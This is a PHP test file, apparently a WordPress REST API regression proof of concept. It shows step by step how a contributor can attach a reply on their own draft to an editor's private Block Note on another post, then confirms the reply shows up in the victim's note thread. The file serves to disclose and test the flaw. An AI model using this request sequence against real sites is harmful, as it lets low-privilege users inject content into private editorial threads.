<?php
/**
 * Regression PoC for cross-post parent injection into private Block Notes.
 *
 * @group restapi
 * @group wp-notes-cross-parent
 */
class WP_Test_REST_Comments_Note_Cross_Parent extends WP_Test_REST_TestCase {
	protected static $editor_id;
	protected static $contributor_id;

	public static function wpSetUpBeforeClass( WP_UnitTest_Factory $factory ) {
		self::$editor_id = $factory->user->create(
			array(
				'role' => 'editor',
			)
		);
		self::$contributor_id = $factory->user->create(
			array(
				'role' => 'contributor',
			)
		);
	}

	public static function wpTearDownAfterClass() {
		self::delete_user( self::$editor_id );
		self::delete_user( self::$contributor_id );
	}

	public function test_contributor_can_attach_reply_to_private_note_on_other_post() {
		$victim_post_id = self::factory()->post->create(
			array(
				'post_status' => 'publish',
				'post_author' => self::$editor_id,
			)
		);

		$victim_note_id = self::factory()->comment->create(
			array(
				'comment_post_ID'  => $victim_post_id,
				'comment_type'     => 'note',
				'comment_approved' => 1,
				'user_id'          => self::$editor_id,
				'comment_content'  => 'Private victim note.',
			)
		);

		$attacker_post_id = self::factory()->post->create(
			array(
				'post_status' => 'draft',
				'post_author' => self::$contributor_id,
			)
		);

		wp_set_current_user( self::$contributor_id );

		// Sanity check: the attacker cannot read the victim note.
		$hidden = rest_get_server()->dispatch(
			new WP_REST_Request( 'GET', '/wp/v2/comments/' . $victim_note_id )
		);
		$this->assertSame( 403, $hidden->get_status() );

		// Create a note on the attacker's own draft, but point its parent at the
		// victim's private note on a completely different post.
		$request = new WP_REST_Request( 'POST', '/wp/v2/comments' );
		$request->set_param( 'post', $attacker_post_id );
		$request->set_param( 'type', 'note' );
		$request->set_param( 'parent', $victim_note_id );
		$request->set_param( 'content', 'Injected cross-post reply from contributor.' );

		$response = rest_get_server()->dispatch( $request );
		$this->assertSame( 201, $response->get_status() );

		$reply_id = (int) $response->get_data()['id'];
		$reply    = get_comment( $reply_id );

		$this->assertSame( $attacker_post_id, (int) $reply->comment_post_ID );
		$this->assertSame( $victim_note_id, (int) $reply->comment_parent );

		// The victim/editor's note-thread query follows only parent/type/status.
		// It therefore returns the attacker's cross-post reply as a child of the
		// private victim note.
		wp_set_current_user( self::$editor_id );

		$children = new WP_REST_Request( 'GET', '/wp/v2/comments' );
		$children->set_param( 'parent', $victim_note_id );
		$children->set_param( 'type', 'note' );
		$children->set_param( 'status', 'all' );
		$children->set_param( 'context', 'view' );

		$children_response = rest_get_server()->dispatch( $children );
		$this->assertSame( 200, $children_response->get_status() );

		$ids = wp_list_pluck( $children_response->get_data(), 'id' );
		$this->assertContains(
			$reply_id,
			$ids,
			'Victim note thread should not contain a reply created on an unrelated attacker-controlled post.'
		);
	}
}
